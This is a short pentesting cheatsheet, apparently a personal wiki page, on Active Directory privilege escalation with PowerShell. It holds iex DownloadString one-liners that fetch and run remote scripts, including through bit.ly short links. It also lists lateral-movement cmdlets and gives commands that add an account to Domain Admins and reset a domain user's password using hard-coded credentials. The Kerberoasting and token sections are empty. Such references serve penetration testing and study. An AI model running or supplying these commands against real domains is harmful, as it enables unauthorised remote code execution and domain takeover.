---
layout: default
title: Active Directory Privilege Escalation with Powershell
parent: Pentesting
categories: Pentesting Windows
grand_parent: Cheatsheets
has_children: true
---

# {{ page.title}}

## PRE-REQUISITE: Installing PowerUp and PowerSploit

- [PowerUp CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
- [PowerSploit CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerSploit.pdf)

```powershell
# ActiveDirectory Module
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# PowerUp Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\PowerUp.ps1

# PowerSploit Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1

```

## LATERAL MOVEMENT
```powershell
Invoke-DCOM
Invoke-SMBExec
Invoke-PsExec
Invoke-Command
mstsc.exe
```

## TOKEN IMPERSONATION

## ADD MEMBER
```
# OPTION 1
net group "Domain admins" dfm.a /add /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a',$SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $Cred

# VERIFICATION
Get-DomainGroupMember -Identity 'Domain Admins'
```


## FORCE PASSWORD CHANGE
```
# OPTION 1
net user dfm.a Password123! /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a',$SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity jomivz -AccountPassword $UserPassword ' -Credential $Cred
```

## KERBEROASTING
```

```

